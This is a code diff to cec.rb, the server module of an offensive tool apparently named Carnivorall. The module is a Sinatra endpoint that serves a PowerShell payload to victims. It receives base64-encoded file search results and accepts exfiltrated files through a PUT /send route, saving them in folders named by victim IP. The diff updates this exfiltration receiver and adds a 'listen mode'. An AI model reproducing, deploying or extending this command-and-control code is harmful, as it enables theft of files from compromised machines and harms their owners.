@@ -3,14 +3,16 @@
 # Title           :cec.rb
 # Description     :Carnivorall module to send and receive victms requests
 # Authors         :L0stControl
-# Date            :2018/04/12
-# Version         :0.0.1    
+# Date            :2018/04/15
+# Version         :0.1.1    
 # Dependecies     :ruby gems - colorize / sinatra / ipaddr
 #=========================================================================
 
 require 'sinatra'
 require 'colorize'
 require 'ipaddr'
+require 'fileutils'
+require 'date'
 
 lhost = ARGV[0]
 file  = ARGV[1]
@@ -52,9 +54,8 @@ else
     match = match.gsub(" ",'" -or $_.Name -match "')
 end
 
-if file == nil
-    puts "[Error] File not found".red
-    exit
+if file == "notset"
+    puts " [+]".green + " No Powershell payload defined, Listen Mode enable \n".white
 else 
     begin 
         scriptFile = File.open(file, "r")
@@ -66,19 +67,11 @@ else
     end
 end
 
-def saveFile(content, name, directory)
-    FileUtils.mkdir_p("#{directory}#{File.dirname(name)}") unless File.exists?("#{directory}#{File.dirname(name)}")
-    out_file = File.new("#{directory}#{name}", "w")
-    out_file.puts(content)
-    out_file.close
-    puts " [+]".green + " File #{name} saved on #{directory} folder" + "[ OK ]".green
-end
-
 get "/:ps.ps1" do
     "#{payload}"
 end
 
-post "/:content" do 
+post "/content" do 
     resultFind = params[:filecontent].unpack('m*')[0]
     ipVictm = params[:ip].unpack('m*')[0]
 
@@ -89,20 +82,29 @@ post "/:content" do
         puts " [+] ".green + "#{lines.split("\n")[0][18..-1]}".white
        end
     end
-    puts " [+] ----------------------------------------------------------------------------------- \n".yellow
+    puts " [+] End of files \n".yellow
 end
 
-post "/:send" do 
-    fileName = params[:name].unpack('m*')[0]
-    fileContent = params[:content].unpack('m*')[0]
-    if dstFolder.empty?
-        dstFolder = "/tmp"
+put "/send" do 
+    hostName = params[:hn].unpack('m*')[0]
+    fileName = params[:fn].unpack('m*')[0]
+    fileContent = params[:fc].gsub(/\s/,'+').unpack('m*')[0].unpack('a*')[0]
+
+    puts "\n [+]".green + " File from IP...: #{request.ip} | Hostname...: #{hostName} ".white
+    print "  Filename.......: #{fileName} "
+    unless File.directory?("#{dstFolder}/#{request.ip}")
+        FileUtils.mkdir_p("#{dstFolder}/#{request.ip}")
     end
     
-    if !fileName.empty? && !fileContent.empty?
-        saveFile(fileContent, fileName, dstFolder)
-    end
+    onlyFileName = fileName.split("\\").last
 
-    puts "#{fileName}\n#{fileContent}" 
-    puts " [+] ----------------------------------------------------------------------------------- \n".yellow
+    if !fileName.empty? && !fileContent.empty?
+
+        out_file = File.new("#{dstFolder}/#{request.ip}/#{DateTime.now.strftime('%Q')}.#{onlyFileName}", "w")
+        out_file << fileContent
+        out_file.close
+        puts "[OK]\n".green
+    else
+        puts "[Error]\n".red
+    end
 end
